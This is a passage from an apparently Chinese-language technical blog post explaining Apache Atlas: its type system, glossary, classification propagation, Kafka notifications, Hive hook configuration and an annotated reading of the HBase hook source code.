</li>
<li><p>Integration。Atlas对外集成模块。外部组件的元数据通过该模块将元数据交给Atlas管理</p>
</li>
<li><p>Metadata source。Atlas支持的元数据数据源，以插件形式提供。当前支持从以下来源提取和管理元数据：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hive</span><br><span class="line"></span><br><span class="line">HBase</span><br><span class="line"></span><br><span class="line">Sqoop</span><br><span class="line"></span><br><span class="line">Kafka</span><br><span class="line"></span><br><span class="line">Storm</span><br></pre></td></tr></table></figure></li>
<li><p>Applications。Atlas的上层应用，可以用来查询由Atlas管理的元数据类型和对象</p>
</li>
<li><p>Graph Engine（图计算引擎）。Altas使用图模型管理元数据对象。图数据库提供了极大的灵活性，并能有效处理元数据对象之间的关系。除了管理图对象之外，图计算引擎还为元数据对象创建适当的索引，以便进行高效的访问。在Atlas 1.0 之前采用Titan作为图存储引擎，从1.0开始采用 JanusGraph 作为图存储引擎。JanusGraph 底层又分为两块：</p>
</li>
<li><p>Metadata Store。采用 HBase 存储 Atlas 管理的元数据；</p>
</li>
<li><p>Index Store。采用Solr存储元数据的索引，便于高效搜索；</p>
<h2 id="Type-System"><a href="#Type-System" class="headerlink" title="Type System"></a>Type System</h2><h3 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h3><p> Atlas允许用户为他们想要管理的元数据对象定义模型。该模型由称为<code>type(类型)</code>的定义组成。称为<code>entities(实体)</code>的<code>type(类型)</code>实例表示受管理的实际元数据对象。 Type System是一个允许用户定义和管理类型和实体的组件。开箱即用的Atlas管理的所有元数据对象（例如Hive表）都使用类型建模并表示为实体。要在Atlas中存储新类型的元数据，需要了解类型系统组件的概念。</p>
<ul>
<li><p>Type具有元类型。Atlas中有以下元类型：</p>
<ul>
<li>原始元类型(Primitive metatypes)：boolean，byte，short，int，long，float，double，biginteger，bigdecimal，string，date</li>
<li>枚举元型(Enum metatypes)</li>
<li>集合元类型(Collection metatypes:)：array, map</li>
<li>复合元类型(Composite metatypes)：Entity, Struct, Classification, Relationship</li>
</ul>
<p>举个例子，如下</p>
</li>
</ul>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Atlas中的类型(Type)由Name唯一标识</span></span><br><span class="line"><span class="comment">// 实体(Entity)和分类(Classification)类型可以从其他类型继承，称为“超类型/父类型”(supertype) ，它包括在超类型中定义的属性。这允许建模者在一组相关类型等中定义公共属性。类似于面向对象语言如何为类定义父类</span></span><br><span class="line"><span class="comment">// 具有元类型Entity，Struct，Classification或Relationship的类型可以具有属性的集合。每个属性都有一个名称（例如: name）</span></span><br><span class="line">Name:         hive_table</span><br><span class="line">TypeCategory: Entity</span><br><span class="line">SuperTypes:   DataSet</span><br><span class="line">Attributes:</span><br><span class="line">    name:             string</span><br><span class="line">    db:               hive_db</span><br><span class="line">    owner:            string</span><br><span class="line">    createTime:       date</span><br><span class="line">    lastAccessTime:   date</span><br><span class="line">    comment:          string</span><br><span class="line">    retention:        <span class="keyword">int</span></span><br><span class="line">    sd:               hive_storagedesc</span><br><span class="line">    partitionKeys:    array&lt;hive_column&gt;</span><br><span class="line">    aliases:          array&lt;string&gt;</span><br><span class="line">    columns:          array&lt;hive_column&gt;</span><br><span class="line">    parameters:       map&lt;string,string&gt;</span><br><span class="line">    viewOriginalText: string</span><br><span class="line">    viewExpandedText: string</span><br><span class="line">    tableType:        string</span><br><span class="line">    temporary:        <span class="keyword">boolean</span></span><br></pre></td></tr></table></figure>

<h3 id="Entities-实体"><a href="#Entities-实体" class="headerlink" title="Entities(实体)"></a>Entities(实体)</h3><p> Atlas中的<code>entity</code>是<code>type</code>的特定值或实例，因此表示现实世界中的特定元数据对象。用我们对面向对象编程语言的类比，<code>实例(instance)</code>是某个<code>类(Class)</code>的<code>对象(Object)</code>。</p>
<p> 实体的其中一个示例就是Hive表。Hive在’default’数据库中有一个名为’customers’的表。该表是hive_table类型的Atlas中的“实体”。由于是实体类型的实例，它将具有作为Hive表’type’的一部分的每个属性的值，例如：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实体类型的每个实例都由唯一标识符GUID标识。此GUID由Atlas服务器在定义对象时生成，并在实体的整个生命周期内保持不变。在任何时间点，都可以使用其GUID访问此特定实体</span></span><br><span class="line"><span class="comment">// 在此示例中，&#x27;customers&#x27;表是&#x27;hive_table&#x27;类型</span></span><br><span class="line"><span class="comment">// 实体类型的实例具有标识(具有GUID值)，并且可以从其他实体引用（例如，从hive_table实体引用hive_db实体）</span></span><br><span class="line">guid:     <span class="string">&quot;9ba387dd-fa76-429c-b791-ffc338d3c91f&quot;</span></span><br><span class="line">typeName: <span class="string">&quot;hive_table&quot;</span></span><br><span class="line">status:   <span class="string">&quot;ACTIVE&quot;</span></span><br><span class="line">values:</span><br><span class="line">    name:             “customers”</span><br><span class="line">    db:               &#123; <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;b42c6cfc-c1e7-42fd-a9e6-890e0adf33bc&quot;</span>, <span class="string">&quot;typeName&quot;</span>: <span class="string">&quot;hive_db&quot;</span> &#125;</span><br><span class="line">    owner:            “admin”</span><br><span class="line">    createTime:       <span class="number">1490761686029</span></span><br><span class="line">    updateTime:       <span class="number">1516298102877</span></span><br><span class="line">    comment:          <span class="keyword">null</span></span><br><span class="line">    retention:        <span class="number">0</span></span><br><span class="line">    sd:               &#123; <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;ff58025f-6854-4195-9f75-3a3058dd8dcf&quot;</span>, <span class="string">&quot;typeName&quot;</span>: <span class="string">&quot;hive_storagedesc&quot;</span> &#125;</span><br><span class="line">    partitionKeys:    <span class="keyword">null</span></span><br><span class="line">    aliases:          <span class="keyword">null</span></span><br><span class="line">    columns:          [ &#123; <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&quot;</span><span class="number">65e2204f</span>-6a23-<span class="number">4130</span>-934a-9679af6a211f<span class="string">&quot;, &quot;</span>typeName<span class="string">&quot;: &quot;</span>hive_column<span class="string">&quot; &#125;, &#123; &quot;</span>guid<span class="string">&quot;: &quot;</span><span class="string">&quot;d726de70-faca-46fb-9c99-cf04f6b579a6&quot;</span>, <span class="string">&quot;typeName&quot;</span>: <span class="string">&quot;hive_column&quot;</span> &#125;, ...]</span><br><span class="line">    parameters:       &#123; <span class="string">&quot;transient_lastDdlTime&quot;</span>: <span class="string">&quot;1466403208&quot;</span>&#125;</span><br><span class="line">    viewOriginalText: <span class="keyword">null</span></span><br><span class="line">    viewExpandedText: <span class="keyword">null</span></span><br><span class="line">    tableType:        “MANAGED_TABLE”</span><br><span class="line">    temporary:        <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h3 id="Attributes-属性"><a href="#Attributes-属性" class="headerlink" title="Attributes(属性)"></a>Attributes(属性)</h3><p> attributes具有以下properties：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name:        string,</span><br><span class="line">    typeName:    string,</span><br><span class="line">    isOptional:  boolean,</span><br><span class="line">    isIndexable: boolean,</span><br><span class="line">    isUnique:    boolean,</span><br><span class="line">    cardinality: enum</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Glossary"><a href="#Glossary" class="headerlink" title="Glossary"></a>Glossary</h2><p>A Glossary provides appropriate vocabularies for business users and it allows the terms (words) to be related to each other and categorized so that they can be understood in different contexts. These terms can be then mapped to assets like a Database, tables, columns etc. This helps abstract the technical jargon associated with the repositories and allows the user to discover/work with data in the vocabulary that is more familiar to them.</p>
<p>Atlas的术语表(Glossary)提供了一些适当的“单词”，这些“单词”能彼此进行关连和分类，以便业务用户在使用的时候，即使在不同的上下文中也能很好的理解它们。此外，这些术语也是可以映射到数据资产中的，比如：数据库，表，列等。</p>
<p>术语表抽象出了和数据相关的专业术语，使得用户能以他们更熟悉的方式去查找和使用数据。</p>
<h3 id="1-功能"><a href="#1-功能" class="headerlink" title="1. 功能"></a>1. 功能</h3><ul>
<li>能够使用自然语言（技术术语和/或业务术语）定义丰富的术语词汇表。</li>
<li>能够将术语在语义上相互关联。</li>
<li>能够将资产映射到术语表中。</li>
<li>能够按类别划分这些术语。这为术语增加了更多的上下文。</li>
<li>允许按层次结构排列类别，能展示更广泛和更精细的范围。</li>
<li>从元数据中独立管理术语表。</li>
</ul>
<h3 id="2-术语-Term"><a href="#2-术语-Term" class="headerlink" title="2. 术语(Term)"></a>2. 术语(Term)</h3><p>对于企业来说术语作用的非常大的。对于有用且有意义的术语，需要围绕其用途和上下文进行分组。 Apache Atlas中的术语必须具有唯一的qualifiedName，可以有相同名称的术语，但它们不能属于同一个术语表。具有相同名称的术语只能存在于不同的术语表中。</p>
<p>术语名称可以包含空格，下划线和短划线（作为引用单词的自然方式）但不包含“。”或“@”，因为qualifiedName的格式为：<code>&lt;术语&gt;@&lt;术语限定名&gt;</code>。限定名称可以更轻松地使用特定术语。</p>
<p>术语只能属于单个术语表，并且它们的生命周期也是相同的，如果删除术语表，则术语也会被删除。术语可以属于零个或多个类别，这允许将它们限定为更小或更大的上下文。</p>
<p>可以在Apache Atlas中为一个或多个实体分配/链接一个术语。可以使用分类（<code>classifications</code>，类似标签的作用）对术语进行分类，并将相同的分类应用于分配术语的实体。</p>
<h3 id="3-类别-Category"><a href="#3-类别-Category" class="headerlink" title="3. 类别(Category)"></a>3. 类别(Category)</h3><p>类别是组织术语的一种方式，以便可以丰富术语的上下文。</p>
<p>类别可能包含也可能不包含层次结构，即子类别层次结构。类别的qualifiedName是使用它在术语表中的分层位置导出的，例如:<code>&lt;类别名称&gt;.&lt;父类别限定名&gt;</code>。当发生任何层级更改时，此限定名称都会更新，例如：添加父类别，删除父类别或更改父类别。</p>
<h3 id="4-Atlas-Web-UI"><a href="#4-Atlas-Web-UI" class="headerlink" title="4. Atlas Web UI"></a>4. Atlas Web UI</h3><p>Apache Atlas UI提供了友好的用户界面，可以使用术语表相关的功能，其中包括：</p>
<ul>
<li>创建术语表，术语和类别</li>
<li>在术语之间创建各种关系: synonymns(同义词)，antonymns(反义词)，seeAlso(参考)</li>
<li>调整类别的层次结构中</li>
<li>为实体分配实体(entities)</li>
<li>使用关联术语搜索实体</li>
</ul>
<p>与术语表相关的UI都可以在<code>GLOSSARY</code>的Tab下找到。</p>
<h2 id="Classification-Propagation"><a href="#Classification-Propagation" class="headerlink" title="Classification Propagation"></a>Classification Propagation</h2><ul>
<li>Classification propagation enables classifications associated to an entity to be automatically associated with other related entities of the entity. This is very useful in dealing with scenarios where a dataset derives it data from other datasets - like a table loaded with data in a file, a report generated from a table/view, etc.</li>
<li>For example, when a table is classified as <em>PII</em>, tables or views that derive data from this table (via CTAS or ‘create view’ operation) will be automatically classified as <em>PII</em>.</li>
</ul>
<p>Consider the following lineage where data from a ‘hdfs_path’ entity is loaded into a table, which is further made available through views. We will go through various scenarios to understand the classification propagation feature.</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-1.png"></p>
<h5 id="Add-classification-to-an-entity"><a href="#Add-classification-to-an-entity" class="headerlink" title="Add classification to an entity"></a>Add classification to an entity</h5><p>When classification ‘PII’ is added to ‘hdfs_path’ entity, the classification is propagated to all impacted entities in the lineage path, including ‘employees’ table, views ‘us_employees’ and ‘uk_employees’ - as shown below.</p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-2.png"></p>
<h5 id="Update-classification-associated-with-an-entity"><a href="#Update-classification-associated-with-an-entity" class="headerlink" title="Update classification associated with an entity"></a>Update classification associated with an entity</h5><p>Any updates to classifications associated with an entity will be seen in all entities the classification is propagated to as well.</p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-3.png"></p>
<h5 id="Remove-classification-associated-with-an-entity"><a href="#Remove-classification-associated-with-an-entity" class="headerlink" title="Remove classification associated with an entity"></a>Remove classification associated with an entity</h5><p>When a classification is deleted from an entity, the classification will be removed from all entities the classification is propagated to as well.</p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-4.png"></p>
<h5 id="Add-lineage-between-entities"><a href="#Add-lineage-between-entities" class="headerlink" title="Add lineage between entities"></a>Add lineage between entities</h5><p>When lineage is added between entities, for example to capture loading of data in a file to a table, the classifications associated with the source entity are propagated to all impacted entities as well. For example, when a view is created from a table, classifications associated with the table are propagated to the newly created view as well.</p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-5.png" alt="img"></p>
<h5 id="Delete-an-entity"><a href="#Delete-an-entity" class="headerlink" title="Delete an entity"></a>Delete an entity</h5><p><strong>Case 1:</strong> When an entity is deleted, classifications associated with this entity will be removed from all entities the classifications are propagated to. For example. when <em>employees</em> table is deleted, classifications associated with this table are removed from ‘employees_view’ view.</p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-6.png" alt="img"></p>
<p><strong>Case 2:</strong> When an entity is deleted in the middle of a lineage path, the propagation link is broken and previously propagated classifications will be removed from all derived entities of the deleted entity. For example. when ‘us_employees’ table is deleted, classifications propagating through this table (<strong>PII</strong>) are removed from ‘ca_employees’ table, since the only path of propagation is broken by entity deletion.</p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-entity-delete-1.png" alt="img"></p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-entity-delete-2.png" alt="img"></p>
<p><strong>Case 3:</strong> When an entity is deleted in the middle of a lineage path and if there exists alternate path for propagation, previously propagated classifications will be retained. For example. when ‘us_employees’ table is deleted, classifications propagating (<strong>PII</strong>) through this table are retained in ‘ca_employees’ table, since there are two propagation paths available and only one of them is broken by entity deletion.</p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-entity-delete-3.png" alt="img"></p>
<p><img src="https://atlas.apache.org/public/images/twiki/classification-propagation-entity-delete-4.png" alt="img"></p>
<h2 id="Notifications-from-Apache-Atlas"><a href="#Notifications-from-Apache-Atlas" class="headerlink" title="Notifications from Apache Atlas"></a>Notifications from Apache Atlas</h2><p>![image-20210727153841844](/Users/louwen/Library/Application Support/typora-user-images/image-20210727153841844.png)</p>
<h3 id="1-Atlas发出的通知"><a href="#1-Atlas发出的通知" class="headerlink" title="1. Atlas发出的通知"></a>1. Atlas发出的通知</h3><p>Apache Atlas将有关元数据更改的通知发送到名为<code>ATLAS_ENTITIES</code>的Kafka主题。对元数据更改感兴趣的应用程序可以监视这些通知例如，Apache Ranger处理这些通知以根据分类授权数据访问。</p>
<h4 id="1-1-Notifications-V2-Apache-Atlas-version-1-0"><a href="#1-1-Notifications-V2-Apache-Atlas-version-1-0" class="headerlink" title="1.1 Notifications - V2: Apache Atlas version 1.0"></a>1.1 Notifications - V2: Apache Atlas version 1.0</h4><p>Apache Atlas 1.0发送有关元数据的以下操作的通知。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTITY_CREATE:         sent when an entity instance is created</span><br><span class="line">ENTITY_UPDATE:         sent when an entity instance is updated</span><br><span class="line">ENTITY_DELETE:         sent when an entity instance is deleted</span><br><span class="line">CLASSIFICATION_ADD:    sent when classifications are added to an entity instance</span><br><span class="line">CLASSIFICATION_UPDATE: sent when classifications of an entity instance are updated</span><br><span class="line">CLASSIFICATION_DELETE: sent when classifications are removed from an entity instance</span><br></pre></td></tr></table></figure>

<p>通知包括以下数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AtlasEntity               entity;</span><br><span class="line">OperationType             operationType;</span><br><span class="line">List&lt;AtlasClassification&gt; classifications;</span><br></pre></td></tr></table></figure>

<h3 id="2-发送给Atlas的通知"><a href="#2-发送给Atlas的通知" class="headerlink" title="2.发送给Atlas的通知"></a>2.发送给Atlas的通知</h3><p>通过向Kafka主题<code>ATLAS_HOOK</code>发送通知，可以向Apache Atlas通知元数据和血缘的修改。 Apache Hive/Apache HBase/Apache Storm/Apache Sqoop的Atlas hook使用此机制向Apache Atlas通知感兴趣的事件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTITY_CREATE            : create an entity. For more details, refer to Java class HookNotificationV1.EntityCreateRequest</span><br><span class="line">ENTITY_FULL_UPDATE       : update an entity. For more details, refer to Java class HookNotificationV1.EntityUpdateRequest</span><br><span class="line">ENTITY_PARTIAL_UPDATE    : update specific attributes of an entity. For more details, refer to HookNotificationV1.EntityPartialUpdateRequest</span><br><span class="line">ENTITY_DELETE            : delete an entity. For more details, refer to Java class HookNotificationV1.EntityDeleteRequest</span><br><span class="line">ENTITY_CREATE_V2         : create an entity. For more details, refer to Java class HookNotification.EntityCreateRequestV2</span><br><span class="line">ENTITY_FULL_UPDATE_V2    : update an entity. For more details, refer to Java class HookNotification.EntityUpdateRequestV2</span><br><span class="line">ENTITY_PARTIAL_UPDATE_V2 : update specific attributes of an entity. For more details, refer to HookNotification.EntityPartialUpdateRequestV2</span><br><span class="line">ENTITY_DELETE_V2         : delete one or more entities. For more details, refer to Java class HookNotification.EntityDeleteRequestV2</span><br></pre></td></tr></table></figure>

<h2 id="安装组建选择"><a href="#安装组建选择" class="headerlink" title="安装组建选择"></a>安装组建选择</h2><ul>
<li>apache-atlas-1.2.0-sources.tar.gz</li>
<li>solr-5.5.1.tgz</li>
<li>hbase-1.1.2.tar.gz</li>
</ul>
<p>本地编译之后再安装，启动后如下所示</p>
<p><img src="https://z3.ax1x.com/2021/07/28/W7gzgP.png" alt="W7gzgP.png"></p>
<h2 id="Hive血缘关系导入"><a href="#Hive血缘关系导入" class="headerlink" title="Hive血缘关系导入"></a>Hive血缘关系导入</h2><p>官网上有对应的方法，实际操作的时候有一些问题，需要一些额外操作，暂时不展开。</p>
<p>需要在hive中安装对应的hook用来捕获数据，在hive-site.xml中添加如下内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.exec.post.hooks<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.atlas.hive.hook.HiveHook<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Hive hook 可捕获以下操作：</p>
<ul>
<li>create database</li>
<li>create table/view, create table as select</li>
<li>load, import, export</li>
<li>DMLs (insert)</li>
<li>alter database</li>
<li>alter table</li>
<li>alter view </li>
</ul>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="Hbase数据变化流程图"><a href="#Hbase数据变化流程图" class="headerlink" title="Hbase数据变化流程图"></a>Hbase数据变化流程图</h3><p><img src="https://img-blog.csdnimg.cn/20200630201632299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01pbGtjb2ZmZWV6aHU=,size_16,color_FFFFFF,t_70"></p>
<h3 id="实现对HBaseAtlasHook这个类的加载"><a href="#实现对HBaseAtlasHook这个类的加载" class="headerlink" title="实现对HBaseAtlasHook这个类的加载"></a>实现对HBaseAtlasHook这个类的加载</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBaseAtlasCoprocessor</span> <span class="keyword">implements</span> <span class="title">MasterObserver</span>, <span class="title">RegionObserver</span>, <span class="title">RegionServerObserver</span>, <span class="title">BulkLoadObserver</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Log LOG = LogFactory.getLog(HBaseAtlasCoprocessor.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ATLAS_PLUGIN_TYPE               = <span class="string">&quot;hbase&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ATLAS_HBASE_HOOK_IMPL_CLASSNAME = <span class="string">&quot;org.apache.atlas.hbase.hook.HBaseAtlasCoprocessor&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AtlasPluginClassLoader atlasPluginClassLoader = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> Object                 impl                     = <span class="keyword">null</span>;</span><br><span class="line">  	<span class="comment">// 实现这四个接口的作用是为了捕获到在HBase中所有的数据变化</span></span><br><span class="line">    <span class="keyword">private</span> MasterObserver         implMasterObserver       = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> RegionObserver         implRegionObserver       = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> RegionServerObserver   implRegionServerObserver = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> BulkLoadObserver       implBulkLoadObserver     = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在构造生成HBaseAtlasCoprocessor的时候，加载HBaseAtlasHook</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HBaseAtlasCoprocessor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;==&gt; HBaseAtlasCoprocessor.HBaseAtlasCoprocessor()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// HBaseAtlasCoprocessor类初始化的时候将HBaseAtlasHook加载到HBase集群的内存中</span></span><br><span class="line">        <span class="keyword">this</span>.init();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;&lt;== HBaseAtlasCoprocessor.HBaseAtlasCoprocessor()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;==&gt; HBaseAtlasCoprocessor.init()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取HBaseAtlasHook的类加载器</span></span><br><span class="line">            atlasPluginClassLoader = AtlasPluginClassLoader.getInstance(ATLAS_PLUGIN_TYPE, <span class="keyword">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Class&lt;?&gt; cls = Class.forName(ATLAS_HBASE_HOOK_IMPL_CLASSNAME, <span class="keyword">true</span>, atlasPluginClassLoader);</span><br></pre></td></tr></table></figure>

<h3 id="获取HBase变化的数据"><a href="#获取HBase变化的数据" class="headerlink" title="获取HBase变化的数据"></a>获取<code>HBase</code>变化的数据</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBaseAtlasCoprocessor</span> <span class="keyword">extends</span> <span class="title">HBaseAtlasCoprocessorBase</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOG = LoggerFactory.getLogger(HBaseAtlasCoprocessor.class);</span><br><span class="line"></span><br><span class="line">  	<span class="comment">// 定义了hook</span></span><br><span class="line">    <span class="keyword">final</span> HBaseAtlasHook hbaseAtlasHook;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HBaseAtlasCoprocessor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        hbaseAtlasHook = HBaseAtlasHook.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postCreateTable</span><span class="params">(ObserverContext&lt;MasterCoprocessorEnvironment&gt; observerContext, HTableDescriptor hTableDescriptor, HRegionInfo[] hRegionInfos)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;==&gt; HBaseAtlasCoprocessoror.postCreateTable()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        hbaseAtlasHook.sendHBaseTableOperation(hTableDescriptor, <span class="keyword">null</span>, HBaseAtlasHook.OPERATION.CREATE_TABLE);</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;&lt;== HBaseAtlasCoprocessoror.postCreateTable()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="HBaseAtlasHook相关源码"><a href="#HBaseAtlasHook相关源码" class="headerlink" title="HBaseAtlasHook相关源码"></a><code>HBaseAtlasHook</code>相关源码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This will register Hbase entities into Atlas</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBaseAtlasHook</span> <span class="keyword">extends</span> <span class="title">AtlasHook</span> </span>&#123;</span><br><span class="line">  ......</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 调用Atlas的消息通知框架将消息发送到Atlas的消息服务器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> hTableDescriptor          HBase表描述器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tableName                表名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> operation                对表进行的操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendHBaseTableOperation</span><span class="params">(<span class="keyword">final</span> HTableDescriptor hTableDescriptor, <span class="keyword">final</span> TableName tableName, <span class="keyword">final</span> OPERATION operation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;==&gt; HBaseAtlasHook.sendHBaseTableOperation()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//封装HBase的操作为Atlas对消息上下文的封装。</span></span><br><span class="line">            HBaseOperationContext hbaseOperationContext = handleHBaseTableOperation(hTableDescriptor, tableName, operation);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将在前面构建好的对HBase操作的上下文发送到Atlas的kafka服务器</span></span><br><span class="line">            sendNotification(hbaseOperationContext);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            LOG.error(<span class="string">&quot;&lt;== HBaseAtlasHook.sendHBaseTableOperation(): failed to send notification&quot;</span>, t);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;&lt;== HBaseAtlasHook.sendHBaseTableOperation()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendNotification</span><span class="params">(HBaseOperationContext hbaseOperationContext)</span> </span>&#123;</span><br><span class="line">        UserGroupInformation ugi = hbaseOperationContext.getUgi();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ugi != <span class="keyword">null</span> &amp;&amp; ugi.getRealUser() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ugi = ugi.getRealUser();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最终是List&lt;HookNotification&gt; messages把创建表的消息通知过去，最后消息都被封装成HookNotification</span></span><br><span class="line">        notifyEntities(hbaseOperationContext.getMessages(), ugi);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="AtlasHook-相关源码"><a href="#AtlasHook-相关源码" class="headerlink" title="AtlasHook 相关源码"></a>AtlasHook 相关源码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送消息到kafka服务器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> messages                  需要发送的消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> maxRetries                失败之后最大的重试次数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ugi                       用户认证的ugi</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> notificationInterface     Atlas发送消息的框架</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> shouldLogFailedMessages   是否打印失败日志</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> logger                    日志记录器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@VisibleForTesting</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">notifyEntitiesInternal</span><span class="params">(List&lt;HookNotification&gt; messages, <span class="keyword">int</span> maxRetries, UserGroupInformation ugi,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       NotificationInterface notificationInterface,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       <span class="keyword">boolean</span> shouldLogFailedMessages, 